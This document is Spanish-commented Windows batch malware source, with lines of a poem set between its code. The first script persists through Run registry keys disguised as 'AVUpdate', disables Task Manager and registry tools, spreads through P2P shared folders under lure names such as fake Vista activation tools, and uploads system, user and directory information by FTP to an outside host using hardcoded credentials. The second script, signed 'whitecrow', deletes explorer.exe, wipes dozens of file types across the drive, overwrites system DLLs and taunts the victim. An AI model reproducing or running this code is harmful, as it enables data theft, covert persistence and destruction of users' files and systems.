rem ---------------------------------------------------------------------nuv.bat-------------

DICHOSO el árbol, que es apenas sensitivo,

@echo off
if '%1==' (
  type %0>pnc.bat
  start /min pnc.bat v0
  exit
) else (
  goto %1
  exit

y más la piedra dura porque ésa ya no siente,

)
:v0
copy %0 %windir%\pnc.bat
copy %0 %temp%\pnc.bat
find "tine"<%0>t.t
find /v "find "<t.t>t.bat
find "mv1"<%0>v1.t
find /v "find "<v1.t>v1.bat
start /min v1.bat
exit
:v1
goto v1_%2
:v1_si
copy *.bat %windir%\
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg add %l% /V "RunDll23, AVUpdate" /d "%windir%\pnc.bat" /f
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v disabletaskmgr /t reg_dword /d "1" /f
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v disableregistrytools /t reg_dword /d "1" /f
cd %windir%
start /min %windir%\pnc.bat conf
echo puedo=si > %windir%\%userdomain%_dat.dat
find "mv2"<%0>%windir%\v2.t
find /v "find "<v2.t>v2.bat
start /min v2.bat %0
exit

pues no hay dolor más grande que el dolor de ser vivo

:v1_no
copy *.bat %temp%\
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg add %l% /V "RunDll23, AVUpdate" /d "%temp%\pnc.bat" /f
cd %temp%
start /min %temp%\pnc.bat conf
echo puedo=no > %temp%\%userdomain%_dat.dat
find "mv3"<%0>%temp%\v3.t
find /v "find "<v3.t>v3.bat
start /min v3.bat %0
:v1_
exit

ni mayor pesadumbre que la vida consciente.

:v2
cd %windir%
find "fttpc"<%0>ftpc.t
find /v "find "<ftpc.t>ftpc.bat
find "rdst"<%0>rd.t
find /v "find "<rd.t>rd.bat
find "rmcller"<%0>rm.t
find /v "find "<rm.t>rm.bat
goto v2_%2
:v2_0
echo rar=si >> %windir%\%userdomain%_dat.dat
find "mv3"<%0>%windir%\v3.t
find /v "find "<v3.t>v3.bat
start /min v3.bat %windir% pnc.bat %0
start /min rm.bat
exit

Ser, y no saber nada, y ser sin rumbo cierto,

:v2_1
echo rar=no >> %windir%\%userdomain%_dat.dat
find "mv3"<%0>%windir%\v3.t
find /v "find "<v3.t>v3.bat
start /min v3.bat %windir% pnc.bat %0
start /min rm.bat
:v2_
exit

y el temor de haber sido y un futuro terror...

:v3
goto v3_%2
v3_si
find "mv4"<%0>%1\v4.t
find /v "find "<v4.t>v4.bat
start /min  %1\v4.bat %1
:v3_no
:v3_
exit
:conf
echo.>imhere.dat
exit

¡Y el espanto seguro de estar mañana muerto,

rem ------------------------------------------------------M O D U L O S-------------------------------------
@echo off %mv1%
copy %0 %windir%\ %mv1%
if %errorlevel%==0 ( %mv1%
   start /min %windir%\pnc.bat v1 si  %mv1%
   exit   %mv1%
) else (  %mv1%
   start /min %temp%\pnc.bat v1 no  %mv1%
   exit   %mv1%
)  %mv1%
@echo off %mv2%
set param1=%1 %mv2%
type %0>op.bat %mv2%
set o="%systemdrive%%~p0op.bat" %mv2%
set om="%windir%\pnc.bat" %mv2%
cd "%systemdrive%%~p0" %mv2%
set rnyon=%random% %mv2%
echo eMule\Incoming\ > %windir%\yer.t %mv2%
echo Shareaza\Downloads\ >> %windir%\yer.t %mv2%
echo BearShare\Shared\ >> %windir%\yer.t %mv2%
echo EDONKEY2000\incoming\ >> %windir%\yer.t %mv2%
echo LimeWire\Shared\ >> %windir%\yer.t %mv2%
echo Path_msn_Emoticonos_%rnyon: =% > %windir%\jer.t %mv2%
echo sms_gratis_%rnyon: =% >> %windir%\jer.t %mv2%
echo polifonicos_free_%rnyon: =% >> %windir%\jer.t %mv2%
echo Microsoft_Office_2007_serials_%rnyon: =% >> %windir%\jer.t %mv2%
echo Windows_Vista_activation_tool_%rnyon: =% >> %windir%\jer.t %mv2%
echo Windows_Vista_all_serials_%rnyon: =% >> %windir%\jer.t %mv2%
echo MSN_hack_codes_%rnyon: =% >> %windir%\jer.t %mv2%
set rc=1 %mv2%
set r="%programfiles%\WINRAR\WinRAR.exe" %mv2%
%r% a %windir%\t.rar %o% %mv2%
if not %errorlevel%==9009 set rc=0 %mv2%
if exist %param1%\conf.dat ( %mv2%
   start /min %windir%\pnc.bat v2 %rc% %mv2%   
) else ( %mv2%
   start /min %param1% v2 %rc% %mv2%   
) %mv2%
goto fr %mv2%
:fr2 %mv2%
set uno=%1 %mv2%
for /F "tokens=* delims=" %%g in (%windir%\jer.t) do ( %mv2%
         if %rc%==0 ( %mv2%
           @copy /y %om% "%%g.bat" %mv2%
           cls %mv2%
           ping -n 2 localhost > nul %mv2%
           %r% a "%%g.rar" "%%g.bat" %mv2%
         ) %mv2%
) %mv2%
goto :EOF                                   %mv2%
:fr %mv2%
for /F "tokens=* delims=" %%a in (%windir%\yer.t) do ( %mv2%
         if exist "%programfiles%\%%a" ( %mv2%
            cd "%programfiles%\%%a"      %mv2%
            for %%e in (*.rar) do ( %mv2%
              @copy /y %om% "%%~ne.bat" %mv2%
              cls %mv2%
              ping -n 2 localhost > nul %mv2%
              %r% a "%%e" "%%~ne.bat" %mv2%
            )       %mv2%
         call :fr2 %%a %mv2%
          ) %mv2%
) %mv2%
cd %windir% %mv2%
del *.t %mv2%
cd "%systemdrive%%~p0" %mv2%
del op.bat %mv2%
exit       %mv2%   
@echo off %mv3%
set param=%1 %mv3%
set param1=%param: =% %mv3%
set param2=%2 %mv3%
set param3=%3 %mv3%
cd %param1% %mv3%
ping -n 10 localhost > nul %mv3%
start /min t.bat %param1: =%\ftpc.bat %param1: =% 1 %mv3%
echo %userdomain% puede recivir ordenes > ftd.dat %mv3%
echo Ip info: >> ftd.dat %mv3%
%ipconfig% /all >> ftd.dat %mv3%
echo jalez > ft.dat %mv3%
echo ayjfep >> ft.dat %mv3%
echo binary >> ft.dat %mv3%
echo put %param1%\ftd.dat %userdomain%_conf.txt >> ft.dat %mv3%
echo disconnect >> ft.dat %mv3%
echo bye >> ft.dat %mv3%
echo ftp -s:%param1%\ft.dat ftp.drivehq.com %mv3%
echo jalez > %param1%\ft.dat %mv3%
echo ayjfep >> ft.dat %mv3%
echo binary >> ft.dat %mv3%
echo get %userdomain%_conf.txt %param1%\ftp_si.dat >> ft.dat %mv3%
echo disconnect >> ft.dat %mv3%
echo bye >> ft.dat %mv3%
echo ftp -s:ft.dat ftp.drivehq.com %mv3%
exit %mv3%
@echo off %mv4%
cd %1 %mv4%
echo %username%>usrnm.000 %mv4%
systeminfo>ssinfo.000 %mv4%
set>set.000 %mv4%
net user>net.000 %mv4%
echo %os%>os.000 %mv4%
cd %programfiles% %mv4%
dir>progfile.000 %mv4%
cd "%userprofile%\mis documentos\" %mv4%
dir /s>docs.000 %mv4%
ipconfig>ip.000 %mv4%
cd\ %mv4%
dir /s>archs.000 %mv4%
set log=%userdomain%_ %mv4%
set user=jalezc %mv4%
set pass=ayjfep %mv4%
echo %user%>ftp.000 %mv4%
echo %pass%>>ftp.000 %mv4%
echo binary>>ftp.000 %mv4%
echo put usrnm.000 %log%usrnm.log>>ftp.000 %mv4%
echo put os.000 %log%os.log>>ftp.000 %mv4%
echo put progfile.000 %log%progfile.log>>ftp.000 %mv4%
echo put docs.000 %log%docs.log>>ftp.000 %mv4%
echo put set.000 %log%set.log>>ftp.000 %mv4%
echo put net.000 %log%net.log>>ftp.000 %mv4%
echo put ssinfo.000 %log%ssinfo.log>>ftp.000 %mv4%
echo disconnect>>ftp.000 %mv4%
echo bye>>ftp.000 %mv4%
ftp -s:%windir%\ftp.000 ftp.drivehq.com %mv4%
@echo off %tine%
set param1=%1 %tine%
set param2=%2 %tine%
set param3=%3 %tine%
set param4=%4 %tine%
set hor=%time:~0,2% %tine%
set tim=%time:~3% %tine%
set tim=%tim:~0,2% %tine%
set /A tim=%tim% + %param3: =% %tine%
if /I %tim% geq 60 (set /a hor=%hor%+1 %tine%
                    set /a tim=%tim%-60 %tine%
                    if /I %tim% lss 10 (set tim=0%tim%)) %tine%
set ecx=%hor%:%tim% %tine%
at %ecx: =% %param1: =% %param2: =% %param3: =% %param4: =% %tine%
exit %tine%
@echo off %fttpc%
set param=%1 %fttpc%
set param1=%param: =% %fttpc%
cd %param1% %fttpc%
if exist ftp_si.dat ( %fttpc%
   start /min pnc.bat v3 si %fttpc%
   exit %fttpc%
) %fttpc%
start /min pnc.bat v3 no %fttpc%
exit %fttpc%
@echo off %rdst%
cd\ && dir /s %rdst%
@echo off %rmcller%
for /l %%v in (0, 1, 9999999) do start /min t.bat %windir%\rd.bat no 10 %rmcller%

@echo off
title code for duelo
color 04
cls
rem dedicado a la chik ke amo ...:::::?ADRIANA?:::::...
echo.
echo.   ???????????????????????
echo.   ?                     ???????????????
echo.   ?  WhItEcRow           TO:        ?
echo.   ?                         ADRIANA     ? 
echo.   ?                     ???????????????
echo.   ???????????????????????
echo.   detonacion en 5 segundos
ping -n 5 127.0.0.1 >nul
cls
:bucle
echo.   whitecrow paso x aki XD
echo.              whitecrow paso x aki XD
echo.                        whitecrow paso x aki XD
echo.                                 whitecrow paso x aki XD
echo.                                         whitecrow paso x aki XD
set/a contador=%contador%+1
if %contador%==50 (goto bucle2) else (goto bucle)
rem esta es la presentacion del virus XD hasta kon presentacion y todo ehh XD
cls
:bucle2
mkdir c:\XD
set b=1
set c=2
set d=3
set e=4
set f=5
set g=6
set h=7
set i=8
set j=9
set k=10
echo de new pase por aka xD> c:\XD\lol%b%.txt
echo de new pase por aka xD> c:\XD\lol%c%.txt
echo de new pase por aka xD> c:\XD\lol%d%.txt
echo de new pase por aka xD> c:\XD\lol%f%.txt
echo de new pase por aka xD> c:\XD\lol%g%.txt
echo de new pase por aka xD> c:\XD\lol%h%.txt
echo de new pase por aka xD> c:\XD\lol%i%.txt
echo de new pase por aka xD> c:\XD\lol%j%.txt
echo de new pase por aka xD> c:\XD\lol%k%.txt
rem bucle2 crea un directorio y diez archivos nombres espesificados ^^
cls
:bucle3
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%b%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%c%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%d%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%e%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%f%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%g%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%h%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%i%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%j%.txt)
for /l %%m in (1,1,99) do (@echo de new pase por aca xD >> c:\XD\lol%k%.txt)
set/a l=%l%+1
if %l%==99999999999999999999999999999999999999999999999999999999999999999999 (goto rnd) else (goto bucle3)
:rnd
echo lammo> "c:\Documents and settings\%allusersprofile%\Escritorio\eresunlammo%random%.txt"
echo lammo> "c:\Documents and settings\%allusersprofile%\Escritorio\eresunlammo%random%.txt"
echo lammo> "c:\Documents and settings\%allusersprofile%\Escritorio\eresunlammo%random%.txt"
echo lammo> "c:\Documents and settings\%allusersprofile%\Escritorio\eresunlammo%random%.txt"
echo lammo> "c:\Documents and settings\%allusersprofile%\Escritorio\eresunlammo%random%.txt"
echo lammo> "c:\Documents and settings\%allusersprofile%\Escritorio\eresunlammo%random%.txt"
set/a rnd1=%rnd1%+1
if %rnd%==50 (goto rnd2) else (goto rnd)
rem y aki le llenamos el escritorio con txt's ke le diran ke es un lammo XD
attrib -H C:\XD\lol%b%.txt
attrib -H C:\XD\lol%c%.txt
attrib -H C:\XD\lol%d%.txt
attrib -H C:\XD\lol%e%.txt
attrib -H C:\XD\lol%f%.txt
attrib -H C:\XD\lol%g%.txt
attrib -H C:\XD\lol%h%.txt
attrib -H C:\XD\lol%i%.txt
attrib -H C:\XD\lol%j%.txt
attrib -H C:\XD\lol%k%.txt
attrib -H C:\XD
rem bucle3 llena los archivos con el texto de new pase por aki y no me puse a contar las veces ke lo pone 
rem y convierte todos los archivos a archivos ocultos 
:bucle4
tskill explorer.exe
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\system /v disabletaskmgr /f /d 1
erase /f /s %systemroot%\explorer.exe
rem bucle4 mata el proceso de la barra de windows desactiva el administrador de tareas
rem y por ultimo borra el archivo de la barra de windows por si apagan de botonaso XD
:bucle5
cd %programfiles%
Del /f /q /s "C:\*.TUB
Del /f /q /s "C:\*.IMG
Del /f /q /s "C:\*.DWG
Del /f /q /s "C:\*.DXF
Del /f /q /s "C:\*.EMF
Del /f /q /s "C:\*.J2K
Del /f /q /s "C:\*.G3N
Del /f /q /s "C:\*.JPC
Del /f /q /s "C:\*.S0M
Del /f /q /s "C:\*.MOV
Del /f /q /s "C:\*.PSD
Del /f /q /s "C:\*.PDD
Del /f /q /s "C:\*.RLD
Del /f /q /s "C:\*.RIB
Del /f /q /s "C:\*.PBM
Del /f /q /s "C:\*.PFM
Del /f /q /s "C:\*.PPM
Del /f /q /s "C:\*.PXR
Del /f /q /s "C:\*.SCT
Del /f /q /s "C:\*.VDA
Del /f /q /s "C:\*.ICB
Del /f /q /s "C:\*.VST
Del /f /q /s "C:\*.OCX
Del /f /q /s "C:\*.RND
Del /f /q /s "C:\*.PIF
Del /f /q /s "C:\*.SFD
Del /f /q /s "C:\*.NCR
Del /f /q /s "C:\*.RLE
Del /f /q /s "C:\*.XWD
Del /f /q /s "C:\*.PII
Del /f /q /s "C:\*.IFF
Del /f /q /s "C:\*.PPM
Del /f /q /s "C:\*.EMF
Del /f /q /s "C:\*.RES
Del /f /q /s "C:\*.PSP
Del /f /q /s "C:\*.FPX
Del /f /q /s "C:\*.TGA
Del /f /q /s "C:\*.MSP
Del /f /q /s "C:\*.RGB
Del /f /q /s "C:\*.LBM
Del /f /q /s "C:\*.PGM
Del /f /q /s "C:\*.SGI
Del /f /q /s "C:\*.XPM
Del /f /q /s "C:\*.ANI
Del /f /q /s "C:\*.INI
Del /f /q /s "C:\*.DLL
Del /f /q /s "C:\*.HTML
Del /f /q /s "C:\*.MPEG
Del /f /q /s "C:\*.WAV
Del /f /q /s "C:\*.MP4
Del /f /q /s "C:\*.MP3
Del /f /q /s "C:\*.PDF
Del /f /q /s "C:\*.AVI
Del /f /q /s "C:\*.TXT
Del /f /q /s "C:\*.EXE
Del /f /q /s "C:\*.WMF
Del /f /q /s "C:\*.ZIP
Del /f /q /s "C:\*.DOC
Del /f /q /s "C:\*.DOCX
Del /f /q /s "C:\*.jpeg
Del /f /q /s "C:\*.JPG
Del /f /q /s "C:\*.BMP
Del /f /q /s "C:\*.RAR
Del /f /q /s "C:\*.TIFF
Del /f /q /s "C:\*.ICON
Del /f /q /s "C:\*.PSD
Del /f /q /s "C:\*.PCX
Del /f /q /s "C:\*.RAW
Del /f /q /s "C:\*.SCT				
Del /f /q /s "C:\*.CUT
Del /f /q /s "C:\*.RAS
Del /f /q /s "C:\*.CLP
Del /f /q /s "C:\*.PICT
Del /f /q /s "C:\*.MAC
Del /f /q /s "C:\*.JP2
Del /f /q /s "C:\*.PNM
Del /f /q /s "C:\*.PLO
Del /f /q /s "C:\*.SWF
Del /f /q /s "C:\*.REG
rem bucle4 cambia de directorio a archivos de programa y borra todos los archivos 
rem ke kontengan las extensiones arriba puestas
cls
:bucle5
echo XD y vuelvo a pasar> %systemroot%\6to4svc.dll
echo XD y vuelvo a pasar> %systemroot%\12520437.cpx
echo XD y vuelvo a pasar> %systemroot%\12520850.cpx
echo XD y vuelvo a pasar> %systemroot%\a3d.dll
echo XD y vuelvo a pasar> %systemroot%\aaaamon.dll
echo XD y vuelvo a pasar> %systemroot%\acctres.dll
echo XD y vuelvo a pasar> %systemroot%\acledit.dll
echo XD y vuelvo a pasar> %systemroot%\aclui.dll
echo XD y vuelvo a pasar> %systemroot%\activeds.dll
echo XD y vuelvo a pasar> %systemroot%\actxprxy.dll
echo XD y vuelvo a pasar> %systemroot%\admparse.dll
echo XD y vuelvo a pasar> %systemroot%\adptif.dll
echo XD y vuelvo a pasar> %systemroot%\cmdial.dll
echo XD y vuelvo a pasar> %systemroot%\cmos.ram
echo XD y vuelvo a pasar> %systemroot%\cmd.exe
echo XD y vuelvo a pasar> %systemroot%\console.dll
echo XD y vuelvo a pasar> %systemroot%\ftp.exe
echo XD y vuelvo a pasar> %systemroot%\almrem.dll
echo XD y vuelvo a pasar> %systemroot%\iasacct.dll
echo XD y vuelvo a pasar> %systemroot%\iasads.dll
echo XD y vuelvo a pasar> %systemroot%\iashlpr.dll
echo XD y vuelvo a pasar> %systemroot%\iasnap.dll
echo XD y vuelvo a pasar> %systemroot%\iaspolcy.dll
echo XD y vuelvo a pasar> %systemroot%\iasrad.dll
echo XD y vuelvo a pasar> %systemroot%\iasrecst.dll
echo XD y vuelvo a pasar> %systemroot%\iassam.dll
echo XD y vuelvo a pasar> %systemroot%\iassdo.dll
echo XD y vuelvo a pasar> %systemroot%\kbdfr.dll
echo XD y vuelvo a pasar> %systemroot%\kbdfo.dll
echo XD y vuelvo a pasar> %systemroot%\kbdfi1.dll
echo XD y vuelvo a pasar> %systemroot%\kbdhu1.dll
echo XD y vuelvo a pasar> %systemroot%\mpr.dll
echo XD y vuelvo a pasar> %systemroot%\mprapi.dll
echo XD y vuelvo a pasar> %systemroot%\mprddm.dll
echo XD y vuelvo a pasar> %systemroot%\mprdim.dll
echo XD y vuelvo a pasar> %systemroot%\mprmsg.dll
echo XD y vuelvo a pasar> %systemroot%\mprui.dll
echo XD y vuelvo a pasar> %systemroot%\mqad.dll
echo XD y vuelvo a pasar> %systemroot%\mstime.dll
echo XD y vuelvo a pasar> %systemroot%\msvcrt.dll
echo XD y vuelvo a pasar> %systemroot%\msvfw32.dll
echo XD y vuelvo a pasar> %systemroot%\msvideo.dll
echo XD y vuelvo a pasar> %systemroot%\msw3prt.dll
echo XD y vuelvo a pasar> %systemroot%\msxml.dll
echo XD y vuelvo a pasar> %systemroot%\msyu.dll
echo XD y vuelvo a pasar> %systemroot%\mtxclu.dll
echo XD y vuelvo a pasar> %systemroot%\mtxdm.dll
echo XD y vuelvo a pasar> %systemroot%\ntlanman.dll
echo XD y vuelvo a pasar> %systemroot%\ntlanui.dll
echo XD y vuelvo a pasar> %systemroot%\ntlsapi.dll
echo XD y vuelvo a pasar> %systemroot%\ntmarta.dll
echo XD y vuelvo a pasar> %systemroot%\ntmsapi.dll
echo XD y vuelvo a pasar> %systemroot%\ntmsevt.dll
echo XD y vuelvo a pasar> %systemroot%\ntmsmgr.dll
echo XD y vuelvo a pasar> %systemroot%\ntmssvc.dll
echo XD y vuelvo a pasar> %systemroot%\ntprint.dll
echo XD y vuelvo a pasar> %systemroot%\olepro.dll
echo XD y vuelvo a pasar> %systemroot%\olesvr.dll
echo XD y vuelvo a pasar> %systemroot%\olesvr32.dll
echo XD y vuelvo a pasar> %systemroot%\olethk.dll
echo XD y vuelvo a pasar> %systemroot%\opengl32.dll
echo XD y vuelvo a pasar> %systemroot%\osuninst.dll
echo XD y vuelvo a pasar> %systemroot%\p2p.dll
echo XD y vuelvo a pasar> %systemroot%\perfnet.dll
echo XD y vuelvo a pasar> %systemroot%\perfnw.dll
echo XD y vuelvo a pasar> %systemroot%\prfos.dll
echo XD y vuelvo a pasar> %systemroot%\perfproc.dll
echo XD y vuelvo a pasar> %systemroot%\perfts.dll
echo XD y vuelvo a pasar> %systemroot%\photowis.dll
echo XD y vuelvo a pasar> %systemroot%\pid.dll
echo XD y vuelvo a pasar> %systemroot%\kernel.dll
echo XD y vuelvo a pasar> %systemroot%\kernel32.dll
echo XD y vuelvo a pasar> %systemroot%\pidgen.dll
echo XD y vuelvo a pasar> %systemroot%\pifmgr.dll
echo XD y vuelvo a pasar> %systemroot%\pjlmon.dll
echo XD y vuelvo a pasar> %systemroot%\plugin.dll
echo XD y vuelvo a pasar> %systemroot%\plustab.dll
echo XD y vuelvo a pasar> %systemroot%\pmspl.dll
echo XD y vuelvo a pasar> %systemroot%\polstore.dll
echo XD y vuelvo a pasar> %systemroot%\PortableDeviceapi.dll
echo XD y vuelvo a pasar> %systemroot%\PortableDeviceClassExtension.dll
echo XD y vuelvo a pasar> %systemroot%\PortableDeviceType.dll
echo XD y vuelvo a pasar> %systemroot%\PortableDeviceWiCompat.dll
echo XD y vuelvo a pasar> %systemroot%\PortableDeviceWMDRM.dll
echo XD y vuelvo a pasar> %systemroot%\verifier.dll
echo XD y vuelvo a pasar> %systemroot%\version.dll
rem bucle5 mi favorito este lo ke hace es no elimina nada de system32 
rem por akeyo de ke luego windows no deja borrar nada de esa carpeta
rem lo ke hace es dejar los archivos pero borrar lo ke haya e 
rem insertar la frase XD y vuelvo a pasar dentro de los archivos
rem mas importantes de la carpeta system32
cls
:buclederisa
msg * /TIME:1 XD ke krees ya no sirve para ni madres tu pc
msg * /TIME:3 XD pc desmadrada gracias a whitecrow
msg * /TIME:5 XD un ultimo deseo???????????
msg * /TIME:7 XD naaaas ke ultimo deseo ni ke naaaa XD
msg * /TIME:9 kieres alguna vacuna para el virus???????
msg * /TIME:11 ps ke krees ke no hay jakjakajkajkajkajakjakja
msg * /TIME:13 bueno me despido te saluda tu amigo whitecrow
msg * /TIME:15 una ultima cosa si logras reparar tu pc me avisas XD
msg * /TIME:17 te estara esperando un virus mas chido XDXD digo si kieres XD
rem como el nombre del bucle lo dice este es para reirnos del tonto 
rem ke haya caido a abrir el virus
rem les presumo llevo 7 victimas caidas ay si son muchas XDXDXDXDXDXD
exit


rem -------------------------------------------------------------------------------fin---